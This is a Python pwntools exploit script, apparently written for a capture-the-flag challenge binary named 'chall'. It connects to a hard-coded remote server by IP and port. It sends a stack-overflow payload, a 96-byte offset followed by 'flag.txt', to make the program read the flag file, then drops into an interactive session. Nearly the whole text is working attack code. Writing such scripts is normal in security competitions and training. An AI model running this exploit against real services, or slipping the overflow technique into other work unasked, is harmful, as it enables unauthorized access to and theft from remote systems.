#!/usr/bin/python
from pwn import *

CONN = "nc 34.101.174.85 10001".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================

def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x, drop=False): return io.recvuntil(x, drop=drop)
def rl(): return io.recvline()
def cl(): io.clean()
def un64(x): return u64(x.ljust(8, b'\x00'))
def leak(name, addr): info(f"{name} @ {hex(addr)}")

# ===========================================================
#                           SETUP
# ===========================================================

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
c
""".format(
    **locals()
)

# Binary filename
exe = "./chall"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)

# Change logging level to help with debugging (error/warning/info/debug)
# context.terminal = "tmux splitw -h".split(" ")ls
context.log_level = "debug"

# Lib-C library, can use pwninit/patchelf to patch binary
libc = elf.libc
# ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

if args.REMOTE:
    pass
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    # ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

offset = 96

# Start program
io = start()

# Build the payload
payload = flat({offset: [
  b"flag.txt\00"
]})

# Send the payload
sla(b"? ", payload)

# Got Shell?
io.interactive()